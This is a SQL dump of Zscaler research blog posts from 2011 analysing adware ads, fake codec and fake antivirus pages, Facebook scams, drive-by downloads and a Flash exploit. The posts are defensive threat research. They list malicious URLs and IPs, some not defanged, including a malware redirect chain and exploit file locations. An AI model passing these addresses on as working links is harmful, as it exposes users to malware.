INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (329, 'Google Serves Ad For Adware/Spyware', 'Julien Sobrier', 'January 03, 2012', 'Last year, we wrote about Bing and Yahoo! serving ads leading to malicious websites. This week, it was Google who inserted ads for adware/spyware.    I found a suspicious ad in my Google Reader for a free FLV player. I\'ve recently shown that this type of free software is regularly repackaged with adware/spyware for profit.         The ad leads to a download page for FoxTab FLV Player. There is a disclosure statement at the end of the page discussing the content of the bundle: \"This product is totally free and offers the user additional bundle products that may include advertisement.\"       	  		  			  		  		  			FLV Player download page  		  	      The adware/spyware is flagged by only 4 antivirus vendors out of 43. A behavioral analysis of the executable provided much more information about packages that were downloaded and ports open on the machine, etc.    The ad was found on the RSS feed of a security company specialized in cleaning up infected websites. This highlights the fact that even reading content from otherwise legitimate resources can inadvertently lead users to unwanted applications when sites include third-party elements (JavaScript driven ads in this case, but also IFRAMES, widgets, etc.) that they do not not have control over. Even trusted third-parties like Google are apparently not succeeding in delivering 100% adware/spyware free content to users.    Happy New Year 2012!', 'Advertising;Analysis;Compromise;Malware', 'https://www.zscaler.com/blogs/research/google-serves-ad-adwarespyware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (330, 'Web Threats: Trends And Statistics', 'Julien Sobrier', 'December 28, 2011', 'One of the question I often get asked is \"What is the most prevalent threat on the Internet for the enterprises?\". In terms of the total number of transactions, botnets are the biggest security risk. Once a host gets infected, the botnet usually spreads quickly within an enterprise. It also generates a significant amount of traffic to the command and control server, to download additional malware or perform other actions. For the last 30 days, botnets account for almost 80% of the security blocks at Zscaler.         	  		  			  		  		  			Security blocks for the last 30 days  		  	                     When it comes to individual variants of malware, botnets, or other threats, there is no single piece of malware that dominates. Some threats appear one day, and disappear just as quickly. Others are seen daily for months, with random peaks. For example, Blackhole exploits and Zeus have been active for months.                     	  		  			  		  		  			One of the Blackhole exploits  		  	             	  		  			  		  		  			Zeus traffic  			   		  	      Mass infections of legitimate sites can still be seen months after the infection initially occurred and the vulnerable application has been patched. For example, our customers are still hitting websites infected with Lizamoon which was first reported in May 2011 and reached it\'s peak in September.      	  		  			  		  		  			Legitimate sites infected by mass LizaMoon SQL Injection attacks  		  	      The security landscape is very wide. Although botnets, as a category, represent the majority of overall malicious web traffic, there are a huge number of different threats seen daily by enterprise users. This means that security solutions must be able to detect and block a wide variety of traffic by looking at all components: URLs, HTTP header and content on both the client and server side.', 'Exploit Kit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/web-threats-trends-and-statistics');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (331, 'Facebook Used To Make Scams Look Legitimate', 'Julien Sobrier', 'December 21, 2011', 'One of the recurring web spam themes I saw in 2011, was the \"Work from home and make $X,000/month\" scam. In some variations of the well-known and well-used scam, websites are set up to look like a well-established newspaper with a front-page (fake) article about making a lot of money from home.Here are a few examples I saw earlier this year (now offline):Fake NBC website at hxxp://news11bizopp.com/landing.phpFake news site at http://www.nbcnews43.com/?news/articleid=8351The new scam I found this week included an interesting new trick and is still online.Fake news site at hxxp://newsday7.com/The site is set up like the previous scams - it claims to be an online, established newspaper, which displays an article about someone who is making a lot of money, working from home.At the top of the picture, which shows a woman and a girl, on the right, you can see a Facebook Like button that says \"214,217 people recommend this. Be the first of your friends.\" Apparently, 214,217 went to his page and clicked on \"Like\", making this page look more legitimate.At first, I thought this was a fake Facebook widget. But this is the real deal, as seen from the page HTML code:Real Facebook widget (click on the image too see in full screen)There is however a trick. The \"Like\" widget does not point to hxxp://newsday7.com/, but rather to http://www.facebook.com/CBS. As you can see in the images taken from the two websites, the number of Likes is the same:214,217 Likes on hxxp://newsday7.com/214,217 Likes on http://www.facebook.com/CBSFacebook allows you to embed any Like widget on any website, even if the domains or URLs do not correspond. Scammers are using this trick to appear more legitimate, by tricking visitors into thinking their website has been visited and liked by many people.My guess is that this technique is very effective, and will be used more and more by spammers and scammers.', 'Social Engineering;Analysis;Phishing', 'https://www.zscaler.com/blogs/research/facebook-used-make-scams-look-legitimate');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (332, '2012 Security Predictions', 'Michael Sutton', 'December 20, 2011', 'It’s the most wonderful time of the year. A time when we set aside our quarrels and show compassion for complete strangers, realize that it’s better to give than to receive and in the security industry, let everyone know just how smart we are playing Nostradamus. Yes, it wouldn’t be December if I didn’t join in the chorus of prognosticators to let you know exactly what is in store for us all in the coming twelve months. Mobile With WebOS now officially an orphan, Blackberry OS racing to the grave and Windows Mobile still trying to get ready for the party, the victors can be crowned – iOS and Andorid have won. The interesting part of the race is about to begin, namely who has the best security model. Will it be Apple’s draconian, ‘we control everything’ or Google’s happy-go-lucky ‘come on in, everyone’s invited’ approach?Prediction: The ‘do no evil’ company will struggle mightily to keep evil applications out of their App Marketplace. In an effort to avoid being to mobile what Windows is to PCs (a breeding ground for malware), Google will subtly make Android less open to both partners and developers. They will also announce an initiative to increase security screening for applications before deployment in the App Marketplace. Apple on the other hand will have comparatively few malicious apps to deal with, but at least three major OS flaws that impact all users (and make the jailbreak team happy). Apple will address the vulnerabilities several days late and apologize to no one. iPad 3 and iPhone 5 sales will turn financial analysts into giddy schoolgirls. EnterpriseThanks to marketing teams across the globe, APT (Advanced Persistent Threat) has become a meaningless buzzword in the security lexicon. Let’s therefore ditch that term and instead focus on targeted attacks, specifically those focused on enterprises with the goal of corporate espionage or to inflict financial damage. Many praised Google for coming forward in January 2010 to reveal that they and others had been the victim of a sophisticated targeted attack, likely originating from China. Many in the public mistakenly assumed that this was a new and previously unseen event on the security stage. What was new about it was the openness displayed by Google in discussing the situation, not the class of attack. Prediction: The term ‘APT’ will go the way of ‘eCommerce’ and the Dodo bird, but stories of targeted attacks against enterprises will rise tenfold in the media. This will be a reflection of increased activity by attackers as they broaden their reach to smaller companies and decisions by corporate council to disclose details of an attack rather than to suppress the information and risk litigation for trying to cover up such activity. WebWant to know a secret for making security predictions? Take a look at what was being discussed at security conferences 2-3 years ago. At Black Hat DC 2009, I discussed the dangers of persistent web browser storage. One of the key technologies that will be taking browser storage to the next level is HTML5. In 2009, HTML5 apps were few and far between. Thanks in large part to mobile browsers; HTML5 is now much more mainstream. As with any new technology, developers are quickly rushing to play with the new kid on the block and publishing their goods, without taking the time to understand the security implications.Prediction: We’ll see an increasing number of web application vulnerabilities in HTML5 apps, not because the technologies behind them are insecure, but because HTML5 is not well understood from a security perspective. HardwareSecurity in the hardware space is at least ten years behind security in the software industry. This isn’t so much a reflection of the good work being done in software, as it is the reality of software vendors being forced to address an issue that was impacting business. Thanks to the efforts of many great researchers investing countless hours doing QA work that should have been done long before products hit the shelf, today most major security vendors have no choice but to employ security response teams and take vulnerability disclosure very seriously.Hardware vendors simply haven’t faced the same scrutiny, but that’s changing. This year at Blackhat, I spoke about the sad state of embedded web servers and recently researchers at Columbia University discussed the ability to remotely cause physical damage to HP printers due to security flaws.Prediction: Hardware vendors will get a wake-up call as researchers shift their efforts and party like it’s 1999. SocialThe majority of malicious activity surrounding social networks today primarily involves unwanted or nuisance traffic as opposed to attacks that lead to a fully compromised machine. We’re seeing an increase in likejackingand self-inflicted JavaScript injection attacks that have the same overall goal – drive web traffic or prompt software downloads that can earn the scammer a few cents per click. Social networks such as Facebook are of value to more serious criminals, but mainly for reconnaissance during targeted attacks. They are a great resource for learning background information about an individual and uncovering relationships, all of which can be of great value for social engineering. We’re not however, commonly seeing the communication aspects of social networks used to deliver malicious payloads directly to victims or investments in uncovering web application vulnerabilities used to compromise end user machines as opposed to spreading the aforementioned scams.Prediction: Attackers will raise the bar and leverage social networks for more sophisticated attacks, the goal of which will be full compromise as opposed to marketing financial scams.Merry New Year!- michael', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/2012-security-predictions');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (333, 'Java Drive By Download Attack', 'ThreatLabz', 'December 13, 2011', 'Recently I blogged about how attackers are forcing users to download fake codecs to spread malicious content. I’ve also encountered across another drive by download attack vector, which uses Java applets to execute downloaded malicious content on the victim’s machine. Download and execution of malicious content happens without user interaction. Let’s take look at a screen-shot of the malicious URL “hxxp://www.nicholaspettas.com/”,             As you can see, when a user visits the website the browser requests user permission to execute the Java applet code. Here is the HTML source of the page:             When the user allows the applet code to run by clicking on “run” button, the browser downloads the “Client.jar” file from “hxxp://www.nicholaspettas.com/Client.jar”. Let’s take look at the Wireshark captures, which show the network activity performed during this process:             The downloaded JAR file contains “Client.class”, which is executed by the JRE. An argument to the “Client.class” file is passed with the location of the malicious .exe residing on “hxxp://dl.dropbox.com/u/31332834/server_crypt.exe”. It’s interesting to see that the malicious exe file is uploaded on www.dropbox.com. The file “server_crypt.exe” is then downloaded by the above applet code and executed on the victim’s machine.             Decompiling “Client.class” reveals the Java code, which you can read to better understand how it downloads the file and executes it. Let’s have look at piece of decompiled java code, which executes the downloaded file.             Virustotal Reports:  Client.jar - 27 AV vendors on Virustotal reports it as “Trojan Downloader”.  server_crypt.exe - 16 AV vendors reports as “Trojan”    ThreatExpert Report:  server_crypt.exe – Indicated highest severity level for this threat.    Beware of drive by download attacks.    Pradeep', 'Malware', 'https://www.zscaler.com/blogs/research/java-drive-download-attack');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (334, 'Switch To Google Safe Browsing V2', 'Julien Sobrier', 'December 09, 2011', 'Google maintains a list of malicious URLs and phishing sites distributed through their Google Safe Browsing API. On December 12, version 1 was deprecated in favor of version 2. The API for version 2 works quite differently from version 1.Importance of Google Safe BrowsingGoogle Safe Browsing is part of most popular web browsers including Firefox, Chrome, Safari and Opera. Internet Explorer uses it owns list, Microsoft SmartScreen. This makes Google Safe Browsing lists the most used security filter among all web users.The Google Safe Browsing lists are also very extensive. There are currently about 460,000 entries in the lists and they are updated every 30 minutes. You can refer to \"Google Safe Browsing v2: Implementation            Notes\" for more detailed numbers.Coverage I was curious see the overlap between Google Safe Browsing v2 and a few other security blacklistsMalware domain list: 18,670 blocked / 71,352 entries (26%)Clean-MX Phishing: 540 blocked / 1,820 entries (30%)Phishtank: 1,318 blocked / 5,665 entries  (24%)Of the Alexa top 1,000,000 sites, 250 are blocked by Google Safe Browsing v2.Google Safe Browsing v2 librariesThe Google Safe browsing v2 API is fairly complex, at least more so than version 1. There are a number of libraries available, but not all implement the complete API. Here is a list of the libraries available within Google Safe Browsing v2:Language Name Missing features Comment  Python  google-safe-browsing  none  Reference implementation from Google  Perl  Net::Google::SafeBrowsing2  none  Several back-ends available for storage: MySQL, Sqlite, DBI, etc.  PHP  phpgsb  MAC  Helpful statistics for testing  PHP  gsb4u  MAC  Storage: MySQL, Sqlite;  C#  google-safebrowse-v2-client-csharp   MACBack-off mechanism ?Save full hashes, discard them after 45 minutesMAC  Storage: data file  C#  Google-Safe-Browsing-API-2.0-C-p  MAC  Storage: SQL server  Java  jGoogleSafeBrowsing  ???  Not finished? Google Safe Browsing v2 libraries Lookup APIIf you need to check fewer than 10,000 URLs a day, you can use the much simpler Lookup API. This API allows you to send URLs directly to Google and receive the classification.I\'ve made a Perl library for the Lookup API, Net::Google::SafeBrowsing2::Lookup and I\'m working on Ruby anfd Python implementations.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/switch-google-safe-browsing-v2');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (335, 'Fake Video Codecs Still Going Strong', 'ThreatLabz', 'December 06, 2011', 'Convincing users to download malicious software using fake AV pages is not a new attack vector, but has been a very successful one. Julien has previosuly blogged about how fake codecs are starting to replace fake AV pages. I recently encountered an interesting example employing both fake AV and fake codecs in a single attack. When a victim visits a page, they are presented with a warning message stating “You don’t have the correct Codec installed. Download should start automatically, if not, please click here to download”. Here is the screenshot of the page:             The page is loaded from “hxxp://onlinetubes24.com/go.html”. Let’s take a look at the HTML source of the page to identify the malicious code.                  As you can see, it downloads an exe from “hxxp://privatetube.onlinetubes24.com/codec.exe\". If the victim runs “codec.exe”, it starts a fake antivirus scan and delivers a report such as the following:                  The above screenshot is typical of a fake AV attack and displays several fictitious threats being detected on the victim’s computer. Every time you run this exe file, different threats are allegedly detected . Once installed, the victim is asked to activate or buy the full version of this fake AV. This exe file downloads it’s content from a remote web server hosted at “94.23.39.156”. The ThreatExpert report for this IP address details the network activity performed by this malware.               The VirusTotal results for the fake security software in this example show that it is detected by only 20/42 popular AV vendors. You can find some tips to stay away from such attacks in a separate blog post.    Make sure you are downloading real codecs, not fake ones!    Pradeep', 'Malware', 'https://www.zscaler.com/blogs/research/fake-video-codecs-still-going-strong');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (336, 'Cyber Monday Transactions - Indication Of Economy?', 'ThreatLabz', 'November 29, 2011', 'Last year I did a post on the transactions that we saw related to online shopping on Cyber Monday - as I indicated in the past, yes there is a spike. And looking at the transactions this year, again we notice a spike:    You can see the cyclic nature of the work week given that we handle enterprise traffic. The Y-axis values are is the monthly percentage of online shopping/auction transactions. So Cyber Monday made up 7.51% of the November 2011 shopping transactions and Black Friday made up 3.82%. The average for the month was 3.57%, excluding weekends the average for the month was 4.53%. These stats look at web transactions from a \"micro\" level - looking at a a longer-term trend across Black Friday and Cyber Monday online shopping transactions:      We notice a downward trend in online shopping transactions from 2009-2011 Black Fridays and that online shopping transactions have remained fairly static from 2009-2011. In this case the Y-axis is the percentage of online shopping transactions for the day - for example, 4.63% of this Cyber Monday\'s transactions were online shopping. The precise numbers for the other Cyber Mondays were 4.68% in 2009 and 4.61% in 2010. So there was a 0.05% decrease from 2009 to 2010 and a 0.02% increase in 2011. Given the general increase in online shopping vendors, general awareness of \"Cyber Monday\", and people being more comfortable making online purchases I would expect Cyber Monday online shopping to noticeably trend upward. Black Friday online shopping trended downward year over year, and we see the Cyber Monday downturn in 2010 and the slightest increase / stagnation in 2011 -- these online shopping stats may provide an indication as to the health of the economy.', 'Phishing', 'https://www.zscaler.com/blogs/research/cyber-monday-transactions-indication-economy');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (337, 'More Software-related Searches Lead To Malware', 'Julien Sobrier', 'November 22, 2011', 'Spammers have done a very good job a hijacking web searches related to buying software online. More than 90% of search results for \"buy Microsoft Windows\" and similar searches, lead to fake stores on major search engines. Not much has been done by the search engines to clean up these search results.    Since the beginning of 2011, the number of search results for popular queries leading to fake AV pages and malware has dramatically decreased, especially on Google.    I\'ve wondered when attackers would switch from the poisoning popular search phrases, to more targeted searches. In the past few weeks, I\'ve seen more and more spam redirected to malware, where similar searches would previously have led to a fake online store.    For example, the website www.saloncti.com contains multiple spam pages around \"buy microsoft office\" (be careful if you decide to follow the search results). These spam pages are very similar to the spam pages leading to fake stores.       	  		  			  		  		  			Spam page on http://www.saloncti.com/?p=1523  		  	    Instead of a fake store, the visitor is redirected to at least three types of malware.    Fake AV    One of the malicious redirections is to 31.44.184.89. It hosts a Fake AV page. Although the page looks visually the same as the Fake AV pages I\'ve seen so far, the source code is very different.    Here is a video of the Fake AV page. I quickly got blacklisted (see details below in the post), so I had to reconstruct the page on my local machine. On the real website, I would have been prompted to download an executable, which was malware disguised as an antivirus solution.             Naked Emma Watson video    I\'ve described this malicious page in a previous blog post. Basically, the page looks like YouTube, with a purported video of Emma Waston naked. The \"Play\" button warns users that they don\'t have the latest version of Flash and tricks users into installing malware.       	  		  			  		  		  			Fake Flash installation  		  	          Top 10 Famous Celebrity Scandals    This is a variation of the naked Emma Watson video. The page shows a picture of a scantily clad Paris Hilton. Again, the goal is to trick users into installing malware disguised as a Flash update.           The page was hosted on firstuzsoft.rr.nu and was not blocked by Google Safe Browsing. The malicious executable was detected by only 6 AV out of 43. Zscaler\'s free Search Engine Security add-on for Firefox, does protect against these types of sites.    IP checks    There are multiple redirections between the spam page on the initial site (www.saloncti.com) and the final malicious page (31.44.184.89 or firstuzsoft.rr.nu). The referrer and the IP address are checked along the way. Here is a sample of a redirection from a Yahoo! search, to the malicious domain:       	http://search.yahoo.com/ra/click?.bcrumb=tfNYWE9Y1t1&p=site%3Asaloncti.com%20software&cq=[...]  	http://www.saloncti.com/?p=1870 (302 redirection)  	http://74.63.193.178/tra1/change.php?sid=8 (302 redirection)  	http://74.63.193.178/tra1/got.php?sid=8 (302 redirection)  	http://www.communitysupportottawa.ca/cutenews/ip.php (302 redirection)  	http://www.skibec.ca/castor-kanik/cutenews/ss/2.php (302 redirection)  	 http://www3.bestiiarmy.rr.nu/?nlqqufcc=kuHa1bKbmpOZi%2BPdzaaUmNnsq56lopva18%2Bfl6Sqnp%2BU1Z3cntKV    After following a couple of search results, my IP address got blacklisted and I was redirected to ask.com instead of the malicious domain.    It is scary, but predictable, to see attackers switching their targets. I hope the search engines will take the threat of malicious executables more seriously than fake stores and clean up their search results. It will be interesting to see who has the best Blackhat SEO skills: people behind fake stores, or people behind fake AV/Flash pages.', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/more-software-related-searches-lead-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (338, 'Zscaler Likejacking Prevention For Opera', 'Julien Sobrier', 'November 21, 2011', 'Along with Firefox, Chrome and Safari, Zscaler Likejacking Prevention is now also available for Opera. You can download it on the official Opera add-on site.       	  		  			  		  		  			Zscaler Likejacking Prevention on the Opera extensions site  		  	      The Opera version works the same as the Google Chrome version, with a similar popup to obtain more information about the Facebook widgets on the current page.       	  		  			  		  		  			Zscaler Likejacking Prevention for Opera in action  		  	      The red/green icon that indicates if a page is safe or suspicious, is located on the far right of the Opera browser. I believe it would have been more visible if it were part of the URL bar, as I did for Chrome and Firefox, but unfortunately, Opera does not permit such a placement.       	  		  			  		  		  			Icon on the right of the screen, after the search bar  		  	        	  		  			  		  		  			Preferences page  		  	        Limitations    There is one big limitation in Opera: the extension cannot detect hidden Facebook widgets in frames or iframes. This is due to restrictions in the Opera extension framework, which don\'t permit frames and iframes to be linked to the top window. Scripts can be injected in frames and iframes, but it is not possible to know which tab they belong to and the background page cannot communicate with the frames and iframes inside a tab.    In practice, 90% of the hidden Facebook widgets I\'ve seen do not use layers of frames and iframes. Zscaler Likejacking Prevention will help users to stay safe from Facebook spam for the majority of spam pages    Version 1.0.9    I\'m continually improving Zscaler Likejacking Prevention on all platforms. The latest version available is 1.0.9. You can download it and the other plugins we have released, on our Tools page.    Firefox    I expect version 1.1.0 of the Firefox Zscaler Likejacking plugin to be approved on the official Mozilla add-on site within a few days.    -- Julien', 'Click Fraud', 'https://www.zscaler.com/blogs/research/zscaler-likejacking-prevention-opera');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (339, 'When Scammers Call You At Home', 'Julien Sobrier', 'November 18, 2011', 'UPDATE: I\'ve updated the post with a second Skype call I received on 1/17.\r\n\r\nScammers are always trying new ways to reach their targets to foil them into buying free software, sending credit card information, etc. Yesterday, they called me directly at home!\r\n\r\nI was working on my computer when I got a Skype call from an unknown caller with a Skype ID of \"NOTIFICATION® URGENT - WWW.SWNOW.COM - UPGRADE INSTRUCTIONS\". The automated call explained that my \"software protections\" were disabled and I had to urgently go to www.swnow.com (spelled out in the call). I could not record the call, but it was very similar to what you hear when you visit hxxp://www.swnow.com/.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Skype call from a scammer\r\n		\r\n	\r\n\r\n\r\nThe call does not give any information about who is calling or what this \"software protection\" is supposed to be. It lasted 1 min. 50 secs. and basically just urged me to visit www.swnow.com.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Skype call information\r\n		\r\n	\r\n\r\n\r\nWhen visited, hxxp://www.swnow.com/ displays a fake antivirus page. It looks different than the Fake AV sites that use Blackhat spam SEO to reach users. Of course, the site purports that numerous viruses are found on your computer...\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake AV claim to have found viruses\r\n		\r\n	\r\n\r\nThe website is trying to sell the antivirus solution, rather than trying to get user\'s to install malware disguised as a free AV program. The website is well designed. The button \"Activate Computer Protections\" shows an \"activation\" form..\r\n\r\n \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Check out form\r\n		\r\n	\r\n\r\nThen, the website gathers some personal information (name, e-mail address, etc.) via the \"activation\" form.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Information gathering\r\n		\r\n	\r\n\r\n\r\nFinally, the user is sent to a different website, securecheckouts.org, to process the payment.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Payment processing form\r\n		\r\n	\r\n\r\n\r\nLooking at the HTML code, the page only contains an iframe, pointing to hxxp://www.liveadmin.com/affiliates.php?affil104, where the payment form is actually hosted.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			HTML source of securecheckouts.org\r\n		\r\n	\r\n\r\nThere have been a steady rise of websites trying to resell free software (AVG and other antivirus, OpenOffice, P2P clients, etc.) or deliver fake stores that claim to offer software at deep discounts, etc. However, this was the first time that I\'ve encountered a Skype call being used to push users to visit a fake store.\r\n\r\n\r\nSecond call\r\n\r\nI received a similar Skype call on 11/17. I was urged to visit www.msgmf.com to protect my computer. Te website is similar to www.swnow.com. It tricks users into paying $19.95 through click2sell.eu for an antivirus.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Second Skype call spam\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake antivirus on www.msgmf.com\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Antivirus \"activation\" page\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Payment form on click2sell.eu\r\n		\r\n	\r\n\r\n\r\n-- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/when-scammers-call-you-home');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (340, 'Facebook: Anatomy Of Self-Inflicted Javascript Injection', 'ThreatLabz', 'November 16, 2011', 'Many are already familiar with \"likejacking\" (a form of \"clickjacking\") in which a user is tricked into clicking on and interacting with the Facebook \"like\" button -- this has been one of the most common vectors of abusing Facebook. For example, the \"like\" button may be hidden behind an image such as a picture of an embedded YouTube video with a play button. Zscaler released a free browser plugin for identifying and warning of hidden \"like\" buttons in webpages. However, a recent campaign on Facebook in which inappropriate pictures (porn, mutilation, etc.) were spread through user\'s social networks was conducted via a different mechanism that many are unfamiliar with: self-inflicted JavaScript (JS) injection. This post will explain the basic technique and some of what we are seeing on Facebook.         Many people are unaware that they can run JS directly from their browser\'s URL bar. Go ahead and try it. Here is a benign script that pops up a test alert in your browser, enter this into your URL bar: javascript:alert(\'test\');              If you\'re running NoScript it prevents running JS directly from your URL bar to combat social engineering attempts to get users to unknowingly run something malicious, and will provide the following dialog message:          Otherwise, here is a screenshot from entering this in Safari:    In this example on Safari, I was initially on the www.apple.com page before I launched the JS in my URL bar - so you can see the Apple page in the background and the JS alert message appears to have come from www.apple.com. This would change depending on whatever page I was on when I launched the JS in the URL bar - additionally the JS could be modified to interact with or modify content on the current page. In other words, you could run JS that could completely modify the Apple page locally in your browser or interact with buttons or links. This is an important concept to understand and is a technique that is being used to do damage to Facebook accounts / profiles.         The \"same origin policy\" is a security concept used in JS and other browser-side scripting languages that prevents scripts from one website from accessing methods/properties on another website. So when you visit your friend\'s blog, he is unable to have JS execute and automatically interact with your Facebook account. Instead he includes a link at the bottom of his blog to interact with facebook.com and pass a parameter to Facebook saying that you \"like\" his post (the \"like\" button). For example,           www.facebook.com/plugins/like.php?href=HIS_BLOGPAGE&width=120&height=22&layout=button_count&show_faces=false&action=like&colorscheme=light           There is an exception to the \"same origin policy\" in which you can execute script locally within your browser to interact with a page (shown above in the apple.com example). Developers and browser plugins (e.g., greasemonkey) take advantage of this fact to alter various aspects about a webpage. Bad guys are also taking advantage of this fact, by social engineering users to copy/paste or type JS in their URL bar to perform unwanted actions. While logged into Facebook, the JS can automatically perform actions in your account such as, \"liking\" content or messaging your friends.         Facebook has cleaned up most of the offensive content from in the recent campaign. But doing some specific searches I was able to find some examples of this self-inflicted JS injection technique being used on Facebook.         The most common case, are Facebook groups that ask you to join and then enter in some JS into your URL bar. For example,      This JS loops through all of your Friends and suggests / invites them to the group. In other words, this JS performs a bulk invite of a group to all of your Friends. Simple, right?         Here is an example of a more complex and malicious JS I found on FB:      The strings in the JS are all hex encoded, below is the unescaped version:      This JS generates an Facebook invite message to your friends with the message containing an IFrame to: bit.ly/9CxGhY?82         Visiting this shortened link, shows that Bit.Ly is aware of the abuse and warning users from following:         The shortened link was to the now down site:    hxxp://aagmphxa.facebook.joyent.us/goog/index1.php    There are many examples of past abuse from various \"facebook.joyent.us\" sites, here for example.         This technique is not a new technique - Zscaler has reported past abuse examples using this Self-Inflicted JS Injection method, for example:        	\"Hey are you still there\" FB scam  	\"You look so stupid in this video\" FB scam  	Facebook Osama bin Laden death campaigns (specifically, the spyingonyou.info/osama/a.js example)        Be careful of all actions you take while online, to include copying and pasting content into your URL bar.', 'Abuse', 'https://www.zscaler.com/blogs/research/facebook-anatomy-self-inflicted-javascript-injection');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (341, 'More Free Software Repackaged For Money', 'Julien Sobrier', 'November 15, 2011', 'In previous posts, I\'ve shown how popular free software programs are repackaged and sold by scammers, while containing spyware, or are outright replaced by malware. The number of web sites offering such repackaged software has been on the rise in the past weeks [LINK TO PREVIOUS POST]. The most popular repackaged software used to be Flash, antivirus programs and VLC (video player). The list has broadened to contain less-know software such as 7zip (free alternative to Winzip), WinSCP (SCP client for Windows), Filezilla (FTP client), GOM (media player), Notepad++ (powerful text editor), etc.    Here are some of the websites:       	  		  			  		  		  			Filezilla on http://filezilladownload.net/  		  	        	  		  			  		  		  			VLC on http://downloadflashplayer.org/ advertised a s stand-alone Flash player  		  	        	  		  			  		  		  			WinSCP on http://winscpdownload.com/  		  	        	  		  			  		  		  			7zip on http://7zip-download.org/  		  	      Here is a list of 9 similar websites responsible for distributing such malware:    	hxxp://filezilladownload.net/  	hxxp://downloadflashplayer.org/  	hxxp://avi-player.net/  	hxxp://flv-player.org/  	hxxp://gom-player.org/  	hxxp://photoshopfreedownload.net/  	http://winscpdownload.com/  	hxxp://7zip-download.org/  	hxxp://notepaddownload.net/      The files that are downloaded use a similar naming convention - software-setup-win32.exe or software-setup-win32_us.exe: aviplayer-setup-win32.exe, winscp-setup-win32_us.exe, flashplayer-setup-win32,exe, filezilla-setup-win32_us.exe, etc. Their size is always about 1.7MB.    The detection rate amongst AV vendors is very low: only NOD32 was able to find the spyware in the 3 samples I submitted to Virus Total: 1 2 3.       	  		  			  		  		  			Software repackaged by Conversionads  		  	        The software actually makes three changes: it installs the StartNow Toolbar (from Zugo, a company associated with Spyware/Adware), sets MSN as the home page and then sets Bing as the default search engine. All steps are completed by default.       	  		  			  		  		  			Microsoft packages installed by default  		  	        I\'ve found most of these sites through spam comments in forums such as this one on carepages.com:       	  		  			  		  		  			Links to repackaged software  		  	      They are also well referenced by Google. For example, filezilladownload.net shows up at #5 for filezilla download, just after the four search result links to the official filezilla-project.org website               -- Julien', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/more-free-software-repackaged-money');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (342, 'Adobe Flash “SWF” Exploit Still In The Wild.', 'ThreatLabz', 'November 10, 2011', 'A vulnerability reported in Adobe Flash in April 2011 (CVE-2011-0611) continues to be targeted. When first reported, the vulnerability was widely exploited by embedding a “.swf” file into Microsoft Office documents/html pages. Adobe issued patch for this vulnerability soon after it was reported, but the vulnerability remains a popular target.    Source of hxxp://220.181.23.217/baike/mhxy.html :        This exploit code embeds a “nb.swf” flash file into a webpage, which is then executed by the Adobe Flash player object initialized using classid “d27cdb6e-ae6d-11cf-96b8-444553540000”. When the page is being loaded, the malicious “nb.swf” file is downloaded from the URL “http://220.181.23.217/baike/nb.swf”.        Execution of “nb.swf” leads to memory corruption in Flash Player, which allows execution of arbitrary shellcode, which is passed as an input parameter.    Shellcode:        The Virustotal report for “nb.swf” shows it is a Trojan Downloader, used to deliver additional malware to the infected machine.             Flash and other browser plugins remain a popular target for attackers, even for known vulnerabilities that have been patched for some time. This is because attackers know that plugins regularly remain unpatched for some time. The chart below details the most outdated browser plugins seen by Zscaler during Q3 2011. As can be seen, about 7% of all browsers that we see with Flash Player installed, are running an outdated and potentially vulnerable version of the software. Other plugins present are even more frightening targets.        Be sure you update your plugins regularly!    Pradeep', 'Adobe;Exploit;Vulnerability', 'https://www.zscaler.com/blogs/research/adobe-flash-swf-exploit-still-wild');
